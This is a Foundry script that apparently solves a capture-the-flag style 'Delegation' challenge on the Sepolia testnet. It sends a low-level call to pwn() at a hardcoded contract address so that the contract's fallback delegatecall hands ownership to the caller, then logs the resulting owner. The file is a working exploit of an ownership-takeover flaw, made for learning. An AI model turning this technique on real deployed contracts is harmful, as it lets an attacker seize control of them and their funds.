// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script, console} from "forge-std/Script.sol";
import {Delegation} from "../src/Delegation.sol";

contract DelegationScript is Script {
    function setUp() public {
        vm.createSelectFork("https://ethereum-sepolia-rpc.publicnode.com", 6614067);
    }

    function run() public {
        vm.startBroadcast();

        Delegation delegation = Delegation(0x4D4Eb62F71EC7A01D7336dB4871087C8bc8EA42c);

        (bool success, bytes memory data) = 
            0x4D4Eb62F71EC7A01D7336dB4871087C8bc8EA42c.call(abi.encodeWithSignature("pwn()"));

        console.log(success);

        console.log(delegation.owner());
    }
}
